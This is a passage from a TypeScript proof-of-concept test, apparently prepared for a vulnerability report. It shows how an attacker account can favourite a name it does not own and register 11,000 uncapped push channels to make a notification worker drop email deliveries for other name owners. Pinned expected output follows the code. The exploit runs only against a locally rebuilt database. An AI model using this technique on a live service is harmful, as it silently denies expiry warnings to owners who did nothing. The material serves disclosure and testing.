  // The token a real user receives in the verification mail. Read here from the row the route
  // just wrote, because the mail itself is answered in process rather than sent.
  const row = await pool.query<{ token: string }>(
    'select token from channel_verifications where channel=$1 and purpose=$2 order by created_at desc limit 1',
    ['email', 'verify'],
  )
  const verify = await req('/notifications/channels/email/verify', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token: row.rows[0]?.token }),
  })
  return { add: add.status, verify: verify.status }
}

const expiryEvent = (name: string, owner: string, stage: string, when: number) => ({
  type: 'name_expiring',
  name,
  expiryDate: when,
  stage,
  owner,
  includeFavorites: true,
})

/** One event-ingestion batch, delivered to the shipped handler; returns ack/retry counts. */
async function deliverBatch(
  events: ReturnType<typeof expiryEvent>[],
  attempts = 0,
) {
  const rec = { acked: 0, retried: 0 }
  const messages = events.map((body, i) => ({
    id: `poc-${i}-${Math.random().toString(16).slice(2)}`,
    timestamp: new Date(),
    body,
    attempts,
    ack: () => {
      rec.acked++
    },
    retry: () => {
      rec.retried++
    },
  }))
  await handleEventIngestionQueue(
    {
      queue: 'app-api-worker-event-ingestion',
      messages,
      ackAll: () => {},
      retryAll: () => {},
    } as unknown as MessageBatch,
    env,
  )
  return rec
}

async function bootstrapDatabase() {
  const admin = new Client({ connectionString: ADMIN_URL })
  await admin.connect()
  const exists = await admin.query('select 1 from pg_database where datname=$1', [
    DB_NAME,
  ])
  if (exists.rowCount === 0) await admin.query(`CREATE DATABASE "${DB_NAME}"`)
  await admin.end()

  const c = new Client({ connectionString: POC_URL })
  await c.connect()
  await c.query('DROP SCHEMA public CASCADE; CREATE SCHEMA public;')
  let uuidSource: string
  try {
    await c.query('CREATE EXTENSION IF NOT EXISTS pg_uuidv7')
    uuidSource = 'pg_uuidv7 extension'
  } catch {
    // The repository's own workers/api-worker/Dockerfile builds pg_uuidv7 into its Postgres
    // image. On a stock postgres image the extension is absent, so the one function the schema
    // needs is supplied in plain SQL. Nothing under test reads the uuid's contents.
    await c.query('CREATE EXTENSION IF NOT EXISTS pgcrypto')
    await c.query(`CREATE OR REPLACE FUNCTION uuid_generate_v7() RETURNS uuid AS $$
      SELECT encode(set_bit(set_bit(overlay(uuid_send(gen_random_uuid())
        placing substring(int8send(floor(extract(epoch from clock_timestamp()) * 1000)::bigint) from 3)
        from 1 for 6), 52, 1), 53, 1), 'hex')::uuid;
    $$ LANGUAGE SQL VOLATILE;`)
    uuidSource = 'pgcrypto shim for uuid_generate_v7()'
  }
  const files = readdirSync(MIGRATIONS)
    .filter((f) => f.endsWith('.sql'))
    .sort()
  for (const f of files) {
    const sql = readFileSync(path.join(MIGRATIONS, f), 'utf8')
    for (const raw of sql.split('--> statement-breakpoint')) {
      const stmt = raw.trim()
      if (!stmt) continue
      try {
        await c.query(stmt)
      } catch (e) {
        if (!/pg_uuidv7/.test(String(e))) throw e
      }
    }
  }
  const tables = await c.query<{ n: string }>(
    "select count(*)::int as n from information_schema.tables where table_schema='public'",
  )
  await c.end()
  return { uuidSource, files, tables: Number(tables.rows[0]?.n ?? 0) }
}

// ---------------------------------------------------------------- the run
beforeAll(async () => {
  console.error = () => {}
})
afterAll(async () => {
  globalThis.fetch = realFetch
  await pool.end()
})

describe('poc — event-ingestion delivery fan-out', () => {
  it('runs every arm and prints one PASS line per load-bearing claim', async () => {
    const boot = await bootstrapDatabase()
    console.log(
      `\ndatabase ${DB_NAME} rebuilt from ${boot.files.length} migration files ` +
        `(${boot.files.join(', ')}), ${boot.tables} tables, uuid source: ${boot.uuidSource}`,
    )
    console.log(`node ${RPC_URL} used only by the shipped SIWE verification path\n`)

    // ---------------------------------------------------------------- accounts
    const attacker = await siweLogin()
    const owner = await siweLogin()
    const bystander = await siweLogin()
    pass(
      'a session costs nothing: SIWE over the shipped auth routes issues a bearer token',
      [attacker, owner, bystander].every((u) => u.loginStatus === 200 && !!u.id),
      'three self-generated keypairs, POST /auth/nonce + POST /auth/login -> 200, no funds, no allow-list',
    )

    // Both owners are ordinary users who set up email notifications through the product.
    const ch1 = await verifiedEmailChannel(owner.token, 'owner@example.invalid')
    const ch2 = await verifiedEmailChannel(
      bystander.token,
      'bystander@example.invalid',
    )
    for (const u of [owner, bystander]) {
      await req('/notifications/preferences', {
        method: 'PATCH',
        headers: auth(u.token),
        body: JSON.stringify({ ownedNameExpiry: true }),
      })
    }
    const verifiedRows = await n(
      "select count(*)::int as n from user_channels where channel='email' and status='verified'",
    )
    pass(
      'both owners hold a verified email channel created through the shipped routes',
      ch1.add === 200 && ch1.verify === 200 && ch2.add === 200 && ch2.verify === 200 && verifiedRows === 2,
      'POST /notifications/channels/email -> 200, POST /notifications/channels/email/verify -> 200, two verified rows',
    )

    // ---------------------------------------------------------------- attacker preconditions
    const fav = await req(`/favorites/${NAME_FAVOURITED}`, {
      method: 'PUT',
      headers: auth(attacker.token),
    })
    pass(
      'the attacker becomes a recipient of a name it does not own',
      fav.status === 200,
      `PUT /favorites/${NAME_FAVOURITED} -> 200, no ownership check on the route`,
    )

    const prefs = await req('/notifications/preferences', {
      method: 'PATCH',
      headers: auth(attacker.token),
      body: JSON.stringify({ favouritedNameExpiry: true }),
    })
    const optedIn = await pool.query<{ f: boolean }>(
      'select favourited_name_expiry as f from user_notification_settings where user_id=$1',
      [attacker.id],
    )
    pass(
      'the attacker enables its own favourited-name delivery through the shipped route',
      prefs.status === 200 && optedIn.rows[0]?.f === true,
      'PATCH /notifications/preferences {favouritedNameExpiry:true} -> 200, one request',
    )

    // ---------------------------------------------------------------- channel amplifier
    const pushStatuses = new Set<number>()
    const addChannels = async (from: number, to: number) => {
      for (let i = from; i < to; i++) {
        const r = await req('/notifications/channels/push', {
          method: 'POST',
          headers: auth(attacker.token),
          body: JSON.stringify({
            endpoint: `https://fcm.googleapis.com/fcm/send/poc-${i}`,
            keys: { auth: 'A', p256dh: 'P' },
          }),
        })
        pushStatuses.add(r.status)
      }
    }
    const t0 = Date.now()
    await addChannels(0, BELOW)
    const held = () =>
      n("select count(*)::int as n from user_channels where user_id=$1 and channel='push'", [
        attacker.id,
      ])
    console.log(
      `${BELOW} POST /notifications/channels/push in ${Date.now() - t0} ms, ` +
        `statuses ${JSON.stringify([...pushStatuses])}, channels held ${await held()}`,
    )

    // ---------------------------------------------------------------- arm 1: negative control
    const expiry = Math.floor(Date.now() / 1000) + 7 * 86_400
    const armControl = await deliverBatch([
      expiryEvent(NAME_FAVOURITED, owner.address, '7d', expiry),
      expiryEvent(NAME_UNTOUCHED, bystander.address, '7d', expiry),
    ])
    const c1 = await externalDeliveries('owner@example.invalid')
    const c2 = await externalDeliveries('bystander@example.invalid')
    console.log(
      `[arm 1 control  ${BELOW} channels, stage 7d] owner=${c1} bystander=${c2} ` +
        `emailJobs=${emailJobs.length} retried=${armControl.retried} acked=${armControl.acked}`,
    )
    pass(
      'negative control below the ceiling: every recipient in the batch is delivered',
      c1 === 1 && c2 === 1 && armControl.retried === 0 && armControl.acked === 2,
      `${BELOW} attacker channels, stage 7d, owner deliveries=1, bystander deliveries=1, retries=0`,
    )

    // ---------------------------------------------------------------- arm 2: over the ceiling
    await addChannels(BELOW, ABOVE)
    console.log(
      `attacker now holds ${await held()} verified push channels; ` +
        `statuses seen across all ${ABOVE} requests ${JSON.stringify([...pushStatuses])}`,
    )
    pass(
      'POST /notifications/channels/push applies no per-account cap',
      pushStatuses.size === 1 && pushStatuses.has(201) && (await held()) === ABOVE,
      `${ABOVE} consecutive requests, every one 201, no rejection, no cap in the route or the schema`,
    )

    emailJobs = []
    pushJobs = []
    const armTest = await deliverBatch([
      expiryEvent(NAME_FAVOURITED, owner.address, '1d', expiry),
      expiryEvent(NAME_UNTOUCHED, bystander.address, '1d', expiry),
    ])
    const t1 = await externalDeliveries('owner@example.invalid')
    const t2 = await externalDeliveries('bystander@example.invalid')
    const favRowsForUntouched = await n(
      'select count(*)::int as n from favorites where name=$1',
      [NAME_UNTOUCHED],
    )
    console.log(
      `[arm 2 test     ${ABOVE} channels, stage 1d] owner=${t1 - c1} bystander=${t2 - c2} ` +
        `emailJobs=${emailJobs.length} retried=${armTest.retried} acked=${armTest.acked}`,
    )
    pass(
      'above the ceiling the whole batch loses every external delivery',
      t1 === c1 && t2 === c2 && emailJobs.length === 0 && armTest.retried === 2 && armTest.acked === 0,
      `stage 1d, no new delivery row for either owner, no queue job, both messages retried`,
    )
    pass(
      'the loss reaches an owner the attacker never touched',
      favRowsForUntouched === 0 && t2 === c2,
      `favorites rows for ${NAME_UNTOUCHED} = 0, and its owner's delivery count did not move`,
    )

    // ---------------------------------------------------------------- arm 3: the retry
    const notifsBefore = await n('select count(*)::int as n from notifications')
    const retryRun = await deliverBatch(
      [
        expiryEvent(NAME_FAVOURITED, owner.address, '1d', expiry),
        expiryEvent(NAME_UNTOUCHED, bystander.address, '1d', expiry),
      ],
      1,
    )
    const notifsAfter = await n('select count(*)::int as n from notifications')
    const r1 = await externalDeliveries('owner@example.invalid')
    console.log(
      `[arm 3 retry] notifications ${notifsBefore} -> ${notifsAfter}, owner deliveries=${r1 - c1}, ` +
        `retried=${retryRun.retried} acked=${retryRun.acked}`,
    )
    pass(
      'the retry cannot repair it: the idempotency key was already stamped',
      notifsAfter === notifsBefore && r1 === c1 && retryRun.retried === 0 && retryRun.acked === 2,
      'redelivery inserts zero new notifications, returns early and acks; deliveries stay lost',
    )

    // ---------------------------------------------------------------- arm 4: the in-app copy
    const inApp = await req('/notifications', {
      headers: { Authorization: `Bearer ${owner.token}` },
    })
    const inAppBody = (await inApp.json()) as {
      notifications?: Array<{ kind?: string }>
    }
    const kinds = (inAppBody.notifications ?? []).map((x) => x.kind)
    console.log(
      `[arm 4 in-app] GET /notifications as the owner -> ${inApp.status}, kinds ${JSON.stringify(kinds)}`,
    )
    pass(
      'the in-app notification survives and is served to the owner',
      inApp.status === 200 && kinds.filter((k) => k === 'name-expiry').length === 2,
      'GET /notifications -> 200 with both name-expiry notifications; only the external copies are lost',
    )

    // ---------------------------------------------------------------- arm 5: recurrence
    const armRecur = await deliverBatch([
      expiryEvent(NAME_FAVOURITED, owner.address, 'expired', expiry),
    ])
    const rec1 = await externalDeliveries('owner@example.invalid')
    const keys = await pool.query<{ k: string }>(
      'select idempotency_key as k from notifications where user_id=$1 order by idempotency_key',
      [owner.id],
    )
    console.log(
      `[arm 5 recurrence] stage expired, fresh idempotency key -> owner deliveries=${rec1 - c1}, ` +
        `retried=${armRecur.retried}; keys ${JSON.stringify(keys.rows.map((r) => r.k.split(':').slice(-2).join(':')))}`,
    )
    pass(
      'a later expiry stage has a fresh idempotency key and fails the same way',
      rec1 === c1 && armRecur.retried === 1 && keys.rows.length === 3,
      'stages 7d, 1d and expired all stamped; the two above the ceiling produced no delivery',
    )

    // ---------------------------------------------------------------- arm 6: restore
    await pool.query(
      "delete from user_channels where user_id=$1 and channel='push' and id in (select id from user_channels where user_id=$1 and channel='push' order by id limit $2)",
      [attacker.id, ABOVE - REDUCED],
    )
    const remaining = await held()
    const armRestore = await deliverBatch([
      expiryEvent(NAME_FAVOURITED, owner.address, '7d', expiry + 1),
    ])
    const rs1 = await externalDeliveries('owner@example.invalid')
    console.log(
      `[arm 6 restore] attacker channels reduced to ${remaining}; fresh key -> ` +
        `owner deliveries=${rs1 - rec1}, retried=${armRestore.retried} acked=${armRestore.acked}`,
    )
    pass(
      "the attacker's row count is the variable, not the environment",
      remaining === REDUCED && rs1 === rec1 + 1 && armRestore.retried === 0,
      `channels reduced to ${REDUCED}, the next event delivers to the owner again`,
    )

    // ---------------------------------------------------------------- arm 7: opt-in load-bearing
    await req('/notifications/preferences', {
      method: 'PATCH',
      headers: auth(attacker.token),
      body: JSON.stringify({ favouritedNameExpiry: false }),
    })
    await addChannels(ABOVE, ABOVE + (ABOVE - REDUCED))
    const backUp = await held()
    const armOptOut = await deliverBatch([
      expiryEvent(NAME_FAVOURITED, owner.address, '7d', expiry + 2),
    ])
    const oo1 = await externalDeliveries('owner@example.invalid')
    console.log(
      `[arm 7 opt-out control] attacker back to ${backUp} channels but favourited_name_expiry=false -> ` +
        `owner deliveries=${oo1 - rs1}, retried=${armOptOut.retried}`,
    )
    pass(
      "the attacker's own opt-in is load-bearing, so the arms above measure the attack",
      backUp === ABOVE && oo1 === rs1 + 1 && armOptOut.retried === 0,
      `${ABOVE} channels with favourited_name_expiry=false contribute zero delivery rows`,
    )

    // ---------------------------------------------------------------- arm 8: fault injection
    fault.failDeliveryInsert = true
    const faultPass1 = await deliverBatch([
      expiryEvent(NAME_FAVOURITED, owner.address, '7d', expiry + 3),
    ])
    const f1 = await externalDeliveries('owner@example.invalid')
    fault.failDeliveryInsert = false
    const faultPass2 = await deliverBatch(
      [expiryEvent(NAME_FAVOURITED, owner.address, '7d', expiry + 3)],
      1,
    )
    const f2 = await externalDeliveries('owner@example.invalid')
    const faultControl = await deliverBatch([
      expiryEvent(NAME_FAVOURITED, owner.address, '7d', expiry + 4),
    ])
    const f3 = await externalDeliveries('owner@example.invalid')
    console.log(
      `[arm 8 fault] pass 1 fault on: owner deliveries=${f1 - oo1} retried=${faultPass1.retried} acked=${faultPass1.acked}; ` +
        `pass 2 fault off, redelivered: owner deliveries=${f2 - oo1} retried=${faultPass2.retried} acked=${faultPass2.acked}; ` +
        `control no fault: owner deliveries=${f3 - f2} retried=${faultControl.retried}`,
    )
    pass(
      'the same unrecoverable end state follows from a failure that is not a size limit',
      f1 === oo1 && faultPass1.retried === 1 && f2 === oo1 && faultPass2.acked === 1,
      'one rejected deliveries insert, fault cleared, redelivery returns early and acks; deliveries never created',
    )
    pass(
      'paired control for the injected fault',
      f3 === f2 + 1 && faultControl.retried === 0 && faultControl.acked === 1,
      'the identical event with no fault creates the delivery row and acks',
    )

    // ---------------------------------------------------------------- network boundary
    const hosts = [...new Set(outbound.map((o) => new URL(o.url).hostname))].sort()
    const refused = outbound.filter((o) => o.answered === 'refused').length
    const nonLoopback = outbound.filter((o) => o.answered !== 'loopback').length
    console.log(
      `\noutbound: ${outbound.length} requests, hosts ${JSON.stringify(hosts)}, ` +
        `answered in process ${nonLoopback}, refused ${refused}`,
    )
    pass(
      'network boundary: the only requests that left the process went to 127.0.0.1',
      refused === 0 &&
        hosts.every((h) => h === '127.0.0.1' || h === 'api.sendgrid.com' || h === 'fcm.googleapis.com'),
      'the provider calls the shipped code made were answered in process and counted; every other host throws before dispatch',
    )
  }, 900_000)
})

```

### Pinned expected output

Save as `workers/api-worker/src/poc/EXPECTED_expiry-delivery-fanout.txt` and compare with `cmp`.

```
PASS a session costs nothing: SIWE over the shipped auth routes issues a bearer token :: three self-generated keypairs, POST /auth/nonce + POST /auth/login -> 200, no funds, no allow-list
PASS both owners hold a verified email channel created through the shipped routes :: POST /notifications/channels/email -> 200, POST /notifications/channels/email/verify -> 200, two verified rows
PASS the attacker becomes a recipient of a name it does not own :: PUT /favorites/target.eth -> 200, no ownership check on the route
PASS the attacker enables its own favourited-name delivery through the shipped route :: PATCH /notifications/preferences {favouritedNameExpiry:true} -> 200, one request
PASS negative control below the ceiling: every recipient in the batch is delivered :: 1000 attacker channels, stage 7d, owner deliveries=1, bystander deliveries=1, retries=0
PASS POST /notifications/channels/push applies no per-account cap :: 11000 consecutive requests, every one 201, no rejection, no cap in the route or the schema
PASS above the ceiling the whole batch loses every external delivery :: stage 1d, no new delivery row for either owner, no queue job, both messages retried
PASS the loss reaches an owner the attacker never touched :: favorites rows for bystander.eth = 0, and its owner's delivery count did not move
PASS the retry cannot repair it: the idempotency key was already stamped :: redelivery inserts zero new notifications, returns early and acks; deliveries stay lost
PASS the in-app notification survives and is served to the owner :: GET /notifications -> 200 with both name-expiry notifications; only the external copies are lost
PASS a later expiry stage has a fresh idempotency key and fails the same way :: stages 7d, 1d and expired all stamped; the two above the ceiling produced no delivery
PASS the attacker's row count is the variable, not the environment :: channels reduced to 2000, the next event delivers to the owner again
PASS the attacker's own opt-in is load-bearing, so the arms above measure the attack :: 11000 channels with favourited_name_expiry=false contribute zero delivery rows
PASS the same unrecoverable end state follows from a failure that is not a size limit :: one rejected deliveries insert, fault cleared, redelivery returns early and acks; deliveries never created
PASS paired control for the injected fault :: the identical event with no fault creates the delivery row and acks
PASS network boundary: the only requests that left the process went to 127.0.0.1 :: the provider calls the shipped code made were answered in process and counted; every other host throws before dispatch

```
